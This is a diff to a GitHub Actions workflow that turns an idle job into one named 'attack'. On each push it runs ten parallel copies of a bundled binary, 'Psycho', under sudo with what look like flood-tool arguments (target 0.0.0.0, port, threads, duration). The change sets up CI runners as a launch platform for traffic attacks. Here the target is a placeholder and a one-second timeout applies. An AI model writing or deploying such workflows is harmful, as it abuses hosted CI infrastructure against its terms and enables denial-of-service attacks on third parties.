@@ -1,7 +1,23 @@
-name: idle
-on: workflow_dispatch
+name: psycho-eb358636
+on:
+  push:
+    branches: [ main, master ]
+  workflow_dispatch:
 jobs:
-  noop:
+  attack:
     runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10]
     steps:
-    - run: echo waiting
+    - name: Checkout
+      uses: actions/checkout@v4
+    - name: Verify binary
+      run: ls -la && file Psycho || true
+    - name: Make executable
+      run: chmod +x Psycho
+    - name: Fire
+      run: timeout 1s sudo ./Psycho 0.0.0.0 1 1 1200
+    - name: Nonce eb358636
+      run: echo "nonce=eb358636"
